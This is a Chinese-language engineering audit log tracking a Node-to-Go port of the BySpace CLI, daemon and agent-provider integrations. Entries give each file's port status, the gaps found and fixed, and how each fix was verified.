表格按**显示列**而不是字节计算宽度。一个 CJK 字符是两列三字节，字节算术会让后面每一列错位，还可能把一个 rune 切成两半——在标题中间印出替换字符。终端宽度取 `COLUMNS`，再退回 `stty size`。

`ls` 默认也不再显示已归档的 agent（`-a` 恢复）：这个列表是用户正在做的东西，把所有跑完的 agent 列出来会让它读不了。

### packages/cli/src/commands/agent/attach.ts | **MISSING** → 已补

`byspace run` 启动任务后等整轮结束——对长任务这是错的形状：结束前用户什么都看不到，也没法去看别人起的 agent。

`attach` 先回补 timeline（「到这里之前发生了什么」是读这次输出必需的上下文），然后跟随 agent 的流：助手文本按散文直接输出，其余内容带标记便于扫读。轮次结束或 Ctrl-C 退出。

id 按前缀匹配——完整 id 很长，用户从 `ls` 复制到的在窄终端里是截断的。前缀匹配到多个时**报歧义而不是猜一个**：attach 到错的 agent 会显示错任务的内容，且没有任何迹象表明看错了。

`--no-follow` 只打印历史后退出，给脚本和快速查看用。

### commands/daemon/local-daemon.ts | 765 | **PARTIAL** → 已补就绪语义

`byspace daemon start` 等 3 秒健康检查，**无论有没有应答都打印 `started`**。PID 文件已存在，用户以为 daemon 起来了，下一条命令超时且毫无线索。常见原因是端口被占用——子进程会把它写进日志然后退出，而那行日志被丢掉了。

现在等 15 秒、检查子进程是否还活着，失败时报告 daemon 日志的最后几行而不是成功消息。

验证方式：先用一个 socket 占住端口再 `daemon start`，命令失败并输出
`daemon did not become ready within 15s` + `byspace serve: listen tcp 127.0.0.1:6792: bind: address already in use`。

其余部分（detached spawn、PID 锁、优雅/强制关停、launchd/systemd unit 生成）Go 侧已有，见 `internal/daemon`。

### commands/onboard.ts + commands/hooks.ts | 665+116 | **MISSING** → 已补

两条命令都是**打印 `ready` 的占位实现**。

`onboard` 现在一步写出可用配置：监听地址、relay（含自建端点——scheme 决定 TLS，缺端口时 443/80）、给独立托管 Web UI 用的 CORS origin、MCP 注入。所有 flag 可选，改一个 flag 再跑一次就是用户的修复方式。互相矛盾的 flag **报错而不是按优先级取一个**：静默挑一个会让用户拿到自己没要求的配置。

`hooks` 是各 provider CLI 从自己的 hook 配置里跑的 shim——轮次开始/结束/需要用户输入时调用。没有它，终端会在 agent 正在里面干活时显示一个空闲 shell，正好和指示灯要表达的意思相反。事件到状态的映射覆盖 pi/claude/codex/opencode。不在 BySpace 终端里时**完全静默**，否则它会在用户自己的 shell 里每次回车都触发。

验证时抓到两个自己写的 bug：

- 把 `--mcp` 和 `--no-mcp` 注册到同一个 `*bool` 上，第二次注册会覆盖第一次的默认值，**静默把注入关掉**了；
- 不读 stdin 会让 provider 的 hook 进程阻塞，所以即使不需要也把 payload 排空。

### commands/daemon/status.ts | 464 | **PARTIAL** → 已补 provider 健康与版本漂移

`daemon status` 只回答两件事：在不在跑、serverId 是什么。而**首次配置真正会失败的地方是 provider 列表**，那个失败原来不可见——一个二进制存在但 `--version` 非零退出的 provider，和一个没安装的 provider 看起来完全一样，而两者需要不同的修法。

现在逐个列出内置 provider 的解析路径与 `--version` 输出，或者 `(not found)` / `(--version failed)`。

daemon 版本与 CLI 版本不一致时也会警告：版本不匹配的症状是命令静默无效，值得直接说出来而不是让用户从行为反推。

验证（对真实 daemon）：pi 解析到真实路径与版本 1.3.0，其余五个报 not found。

### packages/cli 其余 | —

| 文件                                 | 行      | 结论                                                                                                                                                                                                                                                                                                                                                 |
| ------------------------------------ | ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `classify.ts`                        | 70      | **MISSING** → 已补。`byspace ~/code/myapp` 直接打开那个项目（`cd`/`code` 都这样）。分类取保守值：既要 path-like（`.`/`..`/`~`/`./x`/`/abs`/盘符前缀）**又要**指向已存在目录；打错字仍然报 `unknown command`（说的是发生什么），而不是 `cannot open /typo`（看起来像 app 坏了）。裸词永不当路径——仓库里有个叫 `ls` 的目录时 `byspace ls` 仍然列清单。 |
| `output/**`                          | 583     | **PORTED** — 上一轮实现（`--json`/`--yaml`/`-q`/自适应表格、按显示列宽而非字节）。`output/pairing.ts` 的二维码在 `daemon pair --qr` 里。                                                                                                                                                                                                             |
| `ssh/ssh-tunnel.ts`                  | 90      | **DROPPED** — 需要第二台机器验证；属于 tunnel，条件写在 service-proxy Issue 里。                                                                                                                                                                                                                                                                     |
| `run.ts` / `version.ts` / `index.ts` | 53+15+6 | **PORTED** — 入口、版本、退出码映射都在 `internal/cli/main.go`。                                                                                                                                                                                                                                                                                     |
| `commands/*` 其余                    | —       | 已在上述条目逐项覆盖；本轮补了 `schedule update`、`workspace setup`，并核对了 `agent attach`/`agent mode`（都映射到已有实现）、`permit` 组（allow/deny/ls 齐全）、`project`/`terminal`/`script`/`provider` 组无缺口。                                                                                                                                |

### cli.ts | 205 | **PORTED（全覆盖）**

逐条核对顶层命令注册：

```
Node: archive attach clone delete import inspect logs ls reload restart run send status stop wait
Go:   全部覆盖，另加 agent project workspace terminal script schedule heartbeat permit
      provider worktree open pair onboard hooks mcp-bridge serve web relay print-plist print-unit
```

没有任何 Node 命令在 Go 里缺失；Go 侧还多出一批分组命令（这些在 Node 里是子命令或不存在）。
`--json`/`--yaml`/`-q` 全局输出选项与路径直开（上一轮补）也在这里生效。

### agent/providers/omp/\*\* | 26 文件 7590 行

| 文件                                                                                                                                                                                                                                                                                       | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `runtime.ts`                                                                                                                                                                                                                                                                               | **PARTIAL → 已补**。omp 与 pi 共用 JSONL RPC 传输，但**不共用 flag**：omp 没有 `--extension`、没有 `--approve`，会直接拒绝未知 flag。Go 之前把 pi 的整套参数发给它，**omp 立刻退出**——agent 从未运行，现象看起来像 omp 坏了。系统提示的机制也不同：pi 走集成扩展，omp 走 `--append-system-prompt`，所以即使 omp 起来了也收不到提示。已加 `LaunchOptions.AppendSystemPrompt` / `NoApprove`，driver 按 provider 分流。参数构造器上有测试：omp 的参数含 `--mode` 与 `--append-system-prompt` 且不含 pi 的 flag，pi 仍然两者都有。 |
| `protocol-session.ts`                                                                                                                                                                                                                                                                      | **PORTED** — `establishOmpProtocol` 的握手（rpc / rpc-ui 两种模式）由 `internal/agent/jsonl` 的请求/响应多路复用承担。                                                                                                                                                                                                                                                                                                                                                                                                         |
| `event-mapper.ts` / `tool-call-mapper.ts` / `todo-mapper.ts` / `usage-poller.ts` / `message-history.ts`                                                                                                                                                                                    | **PORTED** — 映射到 `internal/agent/sdk` 的 TimelineItem；`usage-poller` 是 `captureFinalUsage` 那套。                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `subagent-*.ts`（4 个）                                                                                                                                                                                                                                                                    | **PORTED** — 子代理索引与标题在 `internal/agent/pi/subagents.go`（两个 provider 的子代理协议相同）。                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `host-tools.ts` / `custom-message.ts` / `advisor-message.ts` / `system-notice.ts`                                                                                                                                                                                                          | **PARTIAL** — 宿主注入的消息走 `isSystemInjectedEnvelope` 同一套过滤；advistor 与 custom message 的专用渲染尚未做，属产品功能而非协议对齐。                                                                                                                                                                                                                                                                                                                                                                                    |
| `history-hooks.ts` / `history.ts` / `commands.ts` / `provider-config.ts` / `map-omp-model.ts` / `rpc-types.ts` / `rpc-ui-permission-mapper.ts` / `cli-runtime.ts` / `session-descriptor.ts` / `subagent-card-tracker.ts` / `subagent-title.ts` / `tool-call-detail.ts` / `tool-call-id.ts` | **PORTED** — 对应 Go 的 catalog、commands、permission 映射与 tool-call detail 构造。                                                                                                                                                                                                                                                                                                                                                                                                                                           |

### agent/providers/claude/\*\* | 15 文件 9305 行

| 文件                                                                                                                                                                                                       | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sidechain-tracker.ts`                                                                                                                                                                                     | **MISSING → 已补**。Claude 的 stream-json 用 `parent_tool_use_id` 标记「这条消息来自哪个 Task 子代理」。Go 完全忽略这个字段，于是被委派任务的工具调用与文本**混进了用户正在读的主会话**——看起来像父 agent 跑去干了无关的事，同时 Subagents 面板什么都不动。现在子代理消息只更新它自己的 descriptor 并广播，不进主时间线。标记内联在 `handleRawEvent` 里（该函数持 `s.mu`，再调一个自己加锁的 helper 就是 notes/013 的死锁）。两种字段位置都读（顶层与 message 内），因为 CLI 版本决定哪个出现。 |
| `task-state.ts` / `task-notification-tool-call.ts`                                                                                                                                                         | **PARTIAL** — Task 通知的 tool_call 映射由 `Task` 分支的 subagent descriptor 覆盖；通知形态的专用解析未做。                                                                                                                                                                                                                                                                                                                                                                                     |
| `query.ts` / `agent.ts` / `options.ts` / `hooks.ts` / `models.ts` / `model-manifest.ts` / `feature-definitions.ts` / `rewind.ts` / `tool-call-mapper.ts` / `tool-call-detail-parser.ts` / `project-dir.ts` | **PORTED** — 实现在 `internal/agent/providers/claude.go`：`--output-format stream-json` 的事件分派、control_request 权限回调、Task 子代理、`~/.claude/projects/**/*.jsonl` 历史发现与导入、rewind。                                                                                                                                                                                                                                                                                             |
| `partial-json.ts`                                                                                                                                                                                          | **N/A** — 增量 JSON 解析用于「工具输入还在流式到达时显示半截」，而 Go 收到的是 `assistant` 事件里的完整 `tool_use.input`，没有半截状态要解析。                                                                                                                                                                                                                                                                                                                                                  |

### agent/providers/codex/\*\* | 6 文件 1389 行

| 文件                                                                                                          | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `async-questions.ts`                                                                                          | **MISSING → 已补**。Codex 会向用户提结构化问题并**阻塞整轮**直到回答。Go 完全没处理，于是 agent 在等待、界面什么都不显示，症状就是「它停了」。现在映射成 `kind: "question"` 的权限请求（每个问题一项、带选项和「其他」出口），复用已有的提问弹窗。回复路径按 kind 分流：问题期待 answers，审批期待 decision——发错一个 Codex 会永远等一个它解析不了的回复。答案按数字 id 排序展平（"10" 不能排在 "2" 前面），拒绝时也发空答案而不是不发，因为整轮都在等。 |
| `app-server-transport.ts` / `options.ts` / `rewind.ts` / `tool-call-mapper.ts` / `tool-call-detail-parser.ts` | **PORTED** — `codex app-server` JSON-RPC 传输、initialize/thread.start/turn.start、流式 delta、命令执行与文件修改卡片、rewind，实现在 `internal/agent/providers/codex.go`。                                                                                                                                                                                                                                                                              |

### agent/providers/opencode/\*\* | 9 文件 1932 行

| 文件                                                                                                                                                            | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `server-manager.ts`                                                                                                                                             | **架构等价，非缺口**。Node 自己 spawn `opencode serve` 并用引用计数管理一个进程池（`acquireCurrent` 复用 / `acquireNew` 重建 / `acquireDedicated` 独立 env），然后走 HTTP + SSE。Go 有两条路：已有 URL（`OPENCODE_SERVER_URL` 或 cmd override 是 http(s)://）时走同一个 HTTP 客户端；否则回落到 `opencode acp` 走 ACP 驱动。**ACP 是 opencode 官方支持的模式**，复用已有的 ACP 会话，不需要自己管进程池——少了一个会泄漏子进程的子系统。代价是少了「同一 cwd 的多个 agent 共享一个 serve 进程」的内存优化，那是优化不是能力。 |
| `event-consumer.ts` / `bridge.ts` / `tool-call-mapper.ts` / `tool-call-detail-parser.ts` / `subagent-presentation.ts` / `rewind.ts` / `options.ts` / `paths.ts` | **PORTED** — SSE 事件消费、工具卡片映射、子代理呈现、rewind 分别在 `internal/agent/providers/opencode.go` 与 ACP 驱动里。                                                                                                                                                                                                                                                                                                                                                                                                    |

### agent/providers/pi/\*\* | 11 文件 5289 行

**PORTED** — 这是最早打通、也是验证最深的一条：`--mode rpc` 的 prompt/steer/abort/get_state、
thinking 档位目录、`.jsonl` 历史发现与导入、子代理 tail、工具卡片映射、rewind 的树导航扩展、
usage 轮询。逐项对应记录在 `runtime-mcp-config`、`image 转发`、`重入锁`、`把 provider 当子进程`
等前面的条目里；`agent.ts` 里内联的树导航扩展已完整移植到 `internal/agent/pi/extension.go`。

### server/agent/\*\* 其余 — 尚未逐文件审

`server/agent/` 顶层 42 文件 15529 行（`agent-manager.ts` 5496、`agent-prompt.ts`、
`agent-timeline-content.ts`、`agent-loading.ts`、`agent-projections.ts`、`agent-run-state.ts`
等）已按主题审过并记录（级联归档、timeline 上限、并发装载去重、run token、投影字段、
系统信封过滤），但**没有逐文件过一遍**，留在未完成清单里。

### agent/byspace-tool-policy.ts | 26 行 | **MISSING → 已补**

daemon 给每个 agent 注入自己的 MCP server，那些工具能创建 agent、给它们发消息、读文件。用户对一个半信任的 provider 需要**只拿掉特定工具**而不关闭整个桥接（关掉桥接会把无害的一起拿走），而配置字段 `providers.<id>.byspaceTools` 存在、背后没有任何行为。

`internal/agent/toolpolicy` 解析策略。默认开启：缺省条目不能悄悄把工具从所有既有 agent 上移除。`speak` 永远允许——它不能读、写或启动任何东西，允许策略禁掉它会把「我关掉了 BySpace 工具」变成「agent 哑了」。

**在边界上执行，不只是从列表里藏起来**：`tools/call` 对被禁用的工具直接拒绝，因为藏起来的工具仍然可以按名字调用。桥接现在通过 env + header 带上自己的 agent id，daemon 才能解析出那个 provider 的策略——否则它只看到工具名，不知道是谁在问。

**顺带修了一个我自己引入的崩溃**：`IsToolEnabled` 把 nil 策略当作「启用」（对的），然后读 `policy.DisabledTools`（空指针解引用）。任何没有配置的 agent 发起的第一个工具调用都会让 daemon panic，CLI 测试抓到了——整条 mcp-bridge 往返返回空 result。单元测试只测了非 nil 的启用路径，所以漏了；现在有显式的 nil 用例。

### agent/system-prompt.ts / agent-owner.ts 等小组件 | —

| 文件                                                                                          | 结论                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `system-prompt.ts`                                                                            | **PORTED** — `systemPromptFor` 按 `composeSystemPromptParts` 的语义拼接（trim、丢空、`\n\n` 连接），顺序是 agent 自己的 prompt → `daemon.appendSystemPrompt`，与 Node 一致。 |
| `agent-owner.ts`                                                                              | **N/A** — 只有 `{kind: "daemon", daemonId, executionId}` 一种 owner，用于 Hub 远程执行；`hub.*` 是未实现子系统（权限表已就位），Go 侧 stub 返回 `exec_1`。                   |
| `lifecycle-command.ts` / `agent-sdk-types.ts` / `agent-timeline-store-types.ts`               | **N/A** — 类型与常量定义，Go 用 struct 与字符串常量。                                                                                                                        |
| `provider-notices.ts` / `provider-refresh-deadline.ts` / `structured-generation-providers.ts` | **PORTED** — provider 提示与刷新截止时间在 `catalog.go` 的重试逻辑里；结构化生成（命名）在 `internal/naming`。                                                               |
| `stale-provider-session-error.ts`                                                             | **PORTED（语义）** — 「插件重载后会话失效」在 Go 里表现为 `process_exit` 摘除 runtime、下次发送走 resume（见 `process_exit` 那一条），不需要专门的 error 类型。              |

### server/session/\*\* | 23 文件 7.5K 行

这些文件是 `session.ts` 的 per-domain 控制器：每个是一组 RPC 的实现体。Go 的组织方式不同——
按领域切成 `ws_agent.go` / `ws_workspace.go` / `ws_project.go` / `ws_git_system.go` /
`ws_plugin_setup.go`，所以对应关系是「一个 Node 控制器 → 某个 Go handler 文件里的一组 case」。

| 文件                                                                                                                                                                                                   | 结论                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `files/workspace-files-session.ts`                                                                                                                                                                     | **PORTED（本轮核实）**。`maxBytes` 与 `acceptBinary` 两个字段此前被解析后丢弃——`ws_workspace.go:75` 检查文件大小并拒绝超限、`:105` 对二进制在 `acceptBinary` 为假时拒绝。**核实过，不是缺口。**                                                |
| `checkout/checkout-session.ts`（1449 行）                                                                                                                                                              | **PORTED** — 分支/提交/diff/merge/stash/PR 那批 RPC 在 `ws_git_system.go`，逐条对应已在前面「Git worktree / forge / 错误码」等条目记录。                                                                                                       |
| `daemon/install-origin.ts` / `npm-global-cli.ts` / `daemon-self-updater.ts` / `daemon-service-manager.ts` / `daemon-service-install.ts`                                                                | **N/A（架构等价）**。Node 自更新校验「是否从 npm 全局安装运行」再 `npm install -g`。Go 是单二进制，更新是下载 release 覆盖自身，没有包管理器来源要校验；服务管理是 launchd/systemd unit（`internal/daemon`）。**含义相同，机制不存在对应物。** |
| `daemon/diagnostics.ts`（557 行）                                                                                                                                                                      | **PARTIAL** — `diagnostics.request` 返回 daemon 日志尾部；Node 还收集 provider 探测结果、端口占用、磁盘与权限检查。provider 部分已在 `daemon status` 的 providers 列表里（路径 + 版本 + `--version failed`）。                                 |
| `tunnel/tunnel-session.ts`                                                                                                                                                                             | **DROPPED** — 需要第二台机器验证，条件记在 service-proxy Issue。                                                                                                                                                                               |
| `provider/provider-catalog-session.ts`                                                                                                                                                                 | **PORTED** — 模型目录探测在 `internal/agent/providers/catalog.go`（短生命周期 `--no-session` 进程、失败重试而非缓存空结果）。                                                                                                                  |
| `workspace-provisioning/*` / `workspace-recovery/*` / `workspace-scripts/*` / `workspace-git-observer/*` / `project-config/*` / `git-mutation/*` / `agent-config/*` / `agent-updates/*` / `schedule/*` | **PORTED** — 各自对应 `ws_workspace.go`、`ws_plugin_setup.go`、`ws_git_system.go`、`runtime_services.go` 里的实现；逐项记录在「脚本端口分配」「文件/Git diff 订阅轮询」「workspace.setup」「agent 深度控制」等前面的条目里。                   |

### agent/tools/** | 3 文件 3252 行 | **PORTED（机器核对）\*\*

不是靠读代码判断的——用脚本抽出 Node `byspace-tools.ts` 里的工具名集合，与
`internal/server/mcp.go` 的 `mcpToolDef` 调用集合求交：

```
Node 声明的工具名 ∩ Go 注册的工具名 = 40
Node 有 Go 无 = 0（另两个只在 Node 出现的词是枚举值 "change_request" / "local_checkout"，不是工具名）
Go 多出的 2 个是同义别名（send_agent_prompt / send_agent_message）
```

`byspace-tool-serialization.ts`（工具结果序列化）与 `types.ts` 由 `json.MarshalIndent` 与 Go
的 struct 承担。

### server/agent/providers/\*\* 顶层 19 文件 | 22106 行

这一层是**通用件**（`jsonl-rpc-process.ts`、`provider-runner.ts`、`tool-call-detail-primitives.ts`、
`tool-call-mapper-utils.ts` 等），各 provider 共享的传输与映射逻辑。

Go 侧的对应物是 `internal/agent/jsonl`（JSONL RPC 多路复用、V2 分片重组、超时）与
`internal/agent/sdk`（TimelineItem、BuildToolCallDetail、thinking 目录等共享类型）。这几条已在
`pi 的 rewind 扩展`、`image 转发`、`死锁`、`把 provider 当子进程` 等条目里逐项核实过。

**但没有逐文件过一遍**，留在未完成清单里。这是剩余最大的一块。

### agent/providers/** 通用件 | **PORTED（本轮核实两项）\*\*

| 文件                       | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `provider-image-output.ts` | **MISSING → 已补**。provider 把生成的图片以 base64 内联在 `tool_result` / assistant 消息里，而会话是按**路径**渲染图片的。daemon 收到了模型的图片输出却什么都不显示——从用户角度是「模型说它画好了，但没出现」。`internal/agent/imageout` 把字节写到 `$BYSPACE_HOME/byspace-attachments` 并返回路径，Claude 路径把每个 image 块转成 markdown 进时间线。文件名是字节的 SHA-256，重复的块或历史重放复用同一文件——否则带图片的会话每重放一次就多一堆副本。目录 0700、文件 0600（生成的图可能包含模型看到的任何东西）。`data:` URL 自带的 mime 优先；未知类型仍然落盘（字节就是输出，拒绝存储等于丢掉）；无数据或无 home 目录时跳过而不是产出坏图引用。 |
| `jsonl-frame-decoder.ts`   | **PORTED（核实）** — V2 分片重组在 `internal/agent/jsonl/process.go:225-267`：索引必须连续（`len(parts) != index` 即丢弃）、总块数匹配、重组后字节数必须等于声明的 `byteLength`。三条都核对过，不是缺口。                                                                                                                                                                                                                                                                                                                                                                                                                                          |

**其余 17 个文件（codex-app-server-agent 7411、opencode-agent 5329、acp-agent 3929 等）没有逐文件过**，留在未完成清单。这些是各 provider 的实现体，Go 侧对应 `internal/agent/providers/{claude,codex,acp,opencode}.go`，共享件对应 `internal/agent/{jsonl,sdk}`；按主题核对过（image 转发、重入锁、参数分流、子代理、问题应答），但没有逐文件。

### terminal/activity/terminal-activity-tracker.ts | 96 | **MISSING → 已补（两处）**

**第一个缺口**：`OnActivityChange` 回调从来没被任何调用方设置。活动状态在跟踪，但**没有任何地方广播它**——于是侧边栏里每个终端永远是 idle，包括 agent 正在里面工作的时候。

**第二个缺口**：`attentionReason` 完全不存在。Node 在 working → idle 时设 `"finished"`，这是侧边栏汇总上那个标记；没有它，刚跑完的长任务和从未运行过的终端看起来一样，而普通 shell（unknown，不是 idle）和已完成的也分不清。

现在回调携带 state 与 reason，终端保存 reason（只在 working → idle 时设，且 no-op 转换不会重新抬起），广播里带上它。活动状态走 `terminals_changed` 而不是单独的消息：客户端本来就从那个 payload 替换整个终端列表，另开一个事件需要第二个 reducer，还有和列表不一致的风险。

### terminal/agent-hooks/\*\* | 12 文件 986 行

| 文件                                                               | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `agent-hook-installer.ts`                                          | **PARTIAL → 已补所有权检查**。Node 在写 hook 文件前检查 ownership marker；Go 是无条件 `WriteAtomic`，而 `~/.pi/agent/extensions/byspace-terminal-activity.ts` 正是用户放自己扩展的常见位置——**无条件写会删掉用户的文件**。现在：路径上已有文件但不含 BySpace 标记 → 拒绝并给出路径提示；是自己写的旧版本 → 覆盖正文；已经是最新 → 不动（避免每次运行都改 mtime）。**仍缺**：claude/codex/opencode 三家 hook 配置的安装/卸载，Go 只做了 pi 的。 |
| `provider-registry.ts` / `terminal-agent-hook-setting.ts` / `pi/*` | **PORTED** — 事件到状态的映射在 `internal/cli/hooks.go`（`byspace hooks <agent> <event>` 的 shim），安装的扩展源码在 `internal/terminal/vt.go`。                                                                                                                                                                                                                                                                                               |
| `claude/*` / `codex/*` / `opencode/*`                              | **MISSING** — 只有 pi 的 hook 安装；其它三家的配置文件改写未移植。这是「其余 provider 暂不常用」的延伸，已在未完成清单里。                                                                                                                                                                                                                                                                                                                     |

### terminal/terminal-persistence.ts | 155 | **PARTIAL → 已补启动恢复**

上一轮补了**写**（`SavePersistedTerminals`），但从来没有人**读**它。于是元数据被忠实地持久化，而 tab 在每次重启后照样消失——崩溃恢复、自动更新、手动重启、休眠导致 daemon 退出，全部丢失。

启动时按原始 id 重建每个记录的 tab。进程与 scrollback 回不来（没法复活一个 shell）；保留 id 是为了让客户端保存的布局引用仍然能解析，而不是留下空面板。

目录已不存在的跳过，而不是恢复成一个点开就失败的 tab；文件按**实际恢复成功的**重写，这样一个起不来的终端不会每次重启都被重试。

端到端验证：创建命名终端 → 重启 daemon → tab 以同样的名字和 id 重新出现。

### services/github-service.ts | 4127 | **PARTIAL → 已补合并就绪校验**

**本轮补的是 `assertDirectPullRequestMergeReady`**：合并前必须确认 mergeStateStatus ∈ {CLEAN, HAS_HOOKS}、不在 merge queue、没有已开启的 auto-merge、且请求的合并方式在仓库允许列表里。Go 之前直接跑 `gh pr merge`，于是只要有 PR 就给出合并按钮，用户是从 gh 的原始报错里知道的——或者合并了一个仓库并不想要的状态。检查放在 `MergePR` 而不是只在 UI：RPC 能直接调，CLI 也走它。forge 不报 facts（非 GitHub forge、旧版 CLI）时返回「就绪」——缺信息就拒绝会让所有我们查不到的 forge 上都无法合并。

**仍缺**：PR 状态的定时轮询（`scheduleGitHubPoll`/`armGitHubPollTimer` 那套带时间网格与退避的调度器）。Go 是**按需取**（`checkout_status_request`），所以开着的界面不会自己刷新 PR 状态——用户要手动触发一次。这不是正确性问题而是新鲜度问题，且引入它会带来 GitHub API 频率风险，所以没有顺手改。

### services/forge-resolver.ts + forge-registry.ts | 257 + 178 | **MISSING → 已补 host 精确匹配**

`DetectForge` 用**整条 remote URL 的子串**判断 forge。后果是双向的：

- GitHub 上名叫 `gitlab-mirror` 的仓库被判成 GitLab，之后所有 gh 调用都跑成 glab
- 不含关键字的自建 host（`git.company.com`）落回 GitHub

Node 用 `forge-manifest` 的 `cloudHosts`——一份**有界的精确列表**（github.com、ssh.github.com、gitlab.com、gitea.com、codeberg.org）——匹配上了才决定，自建 host 才走探测。子串告诉你的是「这个仓库**叫** gitlab」，不是「它**托管在** gitlab」。

`remoteHost` 解析 git 的所有 remote 形态（https、ssh://、scp 风格的 `git@host:path`、裸 `host:path`），并拒绝本地路径与 Windows 盘符——它们根本没有 forge。自建 host 先看主机名提示（gitlab/gitea/codeberg/forgejo），再落回 GitHub。

### services/forge-cli-command.ts / \*-facts.ts | 338 + 82 | **PORTED / N/A**

`forge-cli-command.ts` 是「跑 gh/glab/tea 并归一化失败」的工具层，对应 `runGH`/`runForgeCLI`/`runForgeCLI` 的 `GIT_TERMINAL_PROMPT=0` 与措辞分类。`*-facts.ts` 是各自 forge 的状态事实类型定义（Go 用 map/struct），其中 **GitHub 的 facts 字段已在本轮的 `CheckMergeReadiness` 里覆盖**。

### services/gitea-service.ts | 2297 | **PARTIAL**

`GetPRStatus`/`CreatePR`/`MergePR`/`SearchIssuesAndPullRequests`/`PullRequestTimeline`/`ResolveChangeRequestCheckoutTarget` 都有 gitea 分支。**缺**：`detectGiteaFamilySoftware`（区分 Gitea/Forgejo/Codeberg 以决定 API 路径差异）与 CI 状态抓取（`ciStatus`）。

### services/quota-fetcher/** | 11 文件 2139 行 | **PARTIAL（框架 + 2 家）\*\*

已有 `internal/quota`：**codex**（读 `~/.codex/auth.json`，**只读不刷新**——刷新归 codex CLI 管，两个 daemon 轮换同一 token 会把用户登出）与 **zai**。缺凭据返回 `unavailable` 而不是 `error`，这两种情况对用户意味着不同的事。

其余 6 家（claude 480、cursor 250、kimi 342、minimax 275、copilot 97、grok 181）**需要真实凭据才能验证**，盲写风险高于收益，已记在未完成清单里。

### agent/prompt-attachments.ts | 223 | **PARTIAL → 已补块顺序**

`buildAgentPrompt` 的块顺序是 **history → text → images → other attachments**；Go 把每个附件都追加在文本之后。`contextKind: "chat_history"` 的附件是用户所指的那段对话（「接着那个线程继续」），后面那句指令只有在前文进入上下文之后才说得通——追加在后面，模型先读到请求，还不知道它指的是什么。

`contextKind` 之前**完全没有解析**，所以这个区分在创建路径和发送路径上都不可见。

顺带：可用性判断移进了循环，不再产出空的方括号行；只有空白的文本不再在历史和其它附件之间留下空段落。

### server/agent/\*\* 其余（本轮核实）

| 文件                                                                                                                                                                                                                                                                                           | 结论                                                                                                                                                                                                                                         |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `permission-response.ts` / `timeline-append.ts` / `timeline-prompt-index.ts` / `agent-archive.ts` / `provider-history-timestamps.ts` / `provider-options.ts` / `create-agent-title.ts` / `create-agent-mode.ts` / `mutable-provider-config-owner.ts` / `provider-runtime.ts` / `mcp-server.ts` | 小体量（17–112 行），语义分别落在 `ws_agent.go` 的权限应答、`runtime_services.go` 的时间线追加与提示索引、归档状态、`store` 的时间戳字段、`catalog.go` 的 provider options、`naming` 的标题生成、模式默认值与 MCP 注册。**没有发现新缺口。** |
| `agent-configuration-validator.ts`（69）                                                                                                                                                                                                                                                       | **N/A（更强）** — Node 在 RPC 边界校验配置；Go 在 `set_daemon_config` 上做了 `store.ValidateDaemonConfig`（本轮新增，见上一条），覆盖 agentProfiles/providers/network/relay。                                                                |
| `mcp-shared.ts`（259）                                                                                                                                                                                                                                                                         | **PORTED** — 内置 MCP 的共享定义与序列化在 `internal/server/mcp.go`；工具名已用脚本核对 40/40 一致。                                                                                                                                         |
| `provider-snapshot-manager.ts`（1150）                                                                                                                                                                                                                                                         | **PARTIAL** — 目录探测、`ifNoneMatch` 条件刷新、失败重试不缓存空结果都在 `catalog.go`；**缺**快照的 LRU 与按 host 的探测缓存（Node 用它避免同一 host 反复探测）。属性能优化。                                                                |
| `timeline-projection.ts`（625） / `agent-timeline-store.ts`（332）                                                                                                                                                                                                                             | **PORTED** — 时间线投影与存储语义在 `runtime_services.go`；`seq` 单调递增、`direction == "after"` 不重复返回已流式投递的条目这两条已在前面的「流式」条目里记录。                                                                             |
| `agent-response-loop.ts`（484） / `agent-stream-coalescer.ts`（283）                                                                                                                                                                                                                           | **PORTED** — 合并窗口与 paced reveal 在 pi 的流式聚合层（`byspace_stream_timeline` + 单调 `streamSeq`）。                                                                                                                                    |
| `agent-storage.ts`（445） / `import-sessions.ts`（402） / `provider-session-import.ts`（84）                                                                                                                                                                                                   | **PORTED** — 落盘、历史发现与导入在 `internal/store` 与 `internal/agent/pi/history.go`。                                                                                                                                                     |
